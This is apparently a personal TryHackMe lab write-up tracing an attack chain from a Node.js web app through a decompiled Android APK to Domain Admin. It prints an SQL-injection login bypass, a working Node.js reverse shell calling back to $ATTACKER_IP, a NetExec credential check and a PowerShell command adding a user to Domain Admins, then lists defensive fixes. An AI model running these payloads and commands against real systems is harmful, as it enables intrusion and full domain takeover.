# Node App to Domain Admin via Mobile App Secrets — TryHackMe

**Date:** 2026-09-10  
**Category:** Web, Mobile, Active Directory, Full Chain  
**Skills used:** Nmap, SQL injection (auth bypass), Node.js RCE, hash cracking, APK decompilation (jadx), SOCKS pivoting, NetExec, BloodHound, AD group abuse  

> **TL;DR:** SQLi auth bypass into a Node.js admin panel led to RCE via a malicious JS upload,
> then credential harvesting from a `shadow.bak` and a leaked SQLite database. Recovered
> hardcoded credentials from a **decompiled Android APK**, found they were **reused on the
> internal AD network**, pivoted in via a SOCKS proxy, and abused a direct **`AddMember`**
> permission on the Domain Admins group with BloodHound to self-escalate to Domain Admin.

## Overview
This chain crossed three environments — web, mobile, and Active Directory — connected entirely
by **credential reuse**:
**Nmap → SQLi login bypass → Node.js file-upload RCE → local credential harvesting → SSH pivot →
APK decompilation → reused credentials on the internal AD → pivot via SOCKS → direct AD group
abuse → Domain Admin.**

## Stage 1 — Recon
Nmap found two open ports: **22** (SSH) and **80**, the latter running a **Node.js** web server.

## Stage 2 — SQL Injection Authentication Bypass
The login form fell to the classic bypass on the **first attempt**:

```
Username: admin' OR 1=1 -- 
```

This logged me in as **admin** immediately, with no further iteration needed.

## Stage 3 — Node.js RCE via Malicious File Upload
The admin panel had a file-upload feature with a **"preview"** option that executed the
uploaded JavaScript server-side. I uploaded a reverse shell:

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "$ATTACKER_IP", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents potential syntax breaks in certain engines
})();
```

Clicking **Preview** executed the file server-side using Node's own `net`/`child_process`
modules — a **server-side JavaScript injection (SSJI)** leading directly to RCE, since the
"preview" feature ran arbitrary uploaded code with no sandboxing.

## Stage 4 — Local Credential Harvesting
From the reverse shell, in a `backup` directory I found **`shadow.bak`**, containing a hash for
the account **`svc-drop`**. Cracked with **hashcat**, the plaintext was **`[REDACTED]`**.

In a separate `db` directory, a file called **`deaddrop.db`** (SQLite) contained sensitive data
— including what appeared to be a password for `svc-backup` and `admin`.

## Stage 5 — SSH Pivot & APK Discovery
Using the cracked `svc-drop` credentials, I **SSH'd in** as `svc-drop`. On that host I found an
Android application package: **`deaddrop-mobile.apk`**.

## Stage 6 — APK Decompilation (New Territory: Mobile)
Decompiling the APK with **jadx**, I inspected its config and found **hardcoded default
credentials**:

```
j.harris : [REDACTED]
```

Shipping default/hardcoded credentials inside a mobile app's config is its own finding,
independent of everything after it — anyone who decompiles the APK gets valid domain
credentials.

## Stage 7 — Pivoting to the Internal AD Network
I set up a **SOCKS pivot** (port 1080) to reach the internal network, where **`$DC_IP`** turned
out to be the domain controller. Using **NetExec (`nxc`)** against SMB with the credentials
pulled from the APK:

```bash
nxc smb $DC_IP -u j.harris -p '[REDACTED]'
```

The result came back **`Pwn3d!`** — confirming the APK's hardcoded credentials were **reused on
the domain** and granted administrative access via SMB. This is the key pivot of the whole
engagement: a secret meant for a mobile app's local config turned out to be a valid, privileged
domain credential.

## Stage 8 — BloodHound: A Direct Path to Domain Admins
Already having a foothold as `j.harris` via **evil-winrm**, I ran BloodHound against the domain.
It showed `j.harris` held an **`AddMember`** privilege directly on the **Domain Admins** group —
meaning the account could add *itself* (or anyone) into Domain Admins with no further exploit
chain required, and that Domain Admins in turn held broad rights over the domain controller
object.

## Stage 9 — Self-Escalation to Domain Admin
With that privilege, escalation was a single PowerShell command:

```powershell
Add-ADGroupMember -Identity "Domain Admins" -Members "j.harris"
```

As a newly-minted Domain Admin, I accessed the Administrator's files directly and captured the
flag.

## The Fix (Defensive View)
- **SQLi auth bypass (Stage 2):** parameterized queries on every login path (see my SQLi
  writeup) — a bypass on the *first attempt* means there was zero input sanitization at all.
- **Unsandboxed "preview" execution (Stage 3):** never execute user-uploaded code server-side,
  even for a "preview." If a preview feature is required, run it in an isolated, network-less
  sandbox (container/VM) with no access to internal resources.
- **Exposed backups & databases (Stage 4):** `shadow.bak` and a SQLite dump reachable from a
  compromised web account means backups and databases aren't isolated from the web root or the
  web-server user's reach — store backups outside any web-accessible or web-process-readable
  path.
- **Hardcoded mobile secrets (Stage 6):** never ship credentials — default or otherwise — inside
  a distributable APK. Anyone can decompile it; use a backend authentication flow instead.
- **Credential reuse across environments (Stage 7):** the single biggest structural failure
  here. A secret for one system (a mobile app) should never also be valid on another (the
  domain). Use distinct, scoped credentials per system, and rotate/revoke on any suspected
  exposure.
- **Direct `AddMember` on Domain Admins (Stages 8–9):** this should never be a routinely
  assigned permission. Audit BloodHound's privileged-group edges regularly — `AddMember`,
  `GenericAll`, `GenericWrite` on Domain Admins/Enterprise Admins are as dangerous as being a
  member outright, since they grant a one-command path to full compromise.

## What I Learned
This was the widest chain I've done — it crossed from a web app, into a Linux host, into a
**mobile APK**, and out into Active Directory, all connected by the same secret being reused
everywhere it shouldn't have been. The standout lesson was Stage 7: credential reuse across
completely different *types* of systems (a mobile config file and a Windows domain) is easy to
overlook individually but devastating once found, because neither system's own security controls
catch it — the failure is entirely architectural. On the AD side, `AddMember` on Domain Admins
was a reminder that BloodHound's privileged edges aren't just about existing group membership;
a permission to *modify* a privileged group is just as dangerous as being in it.
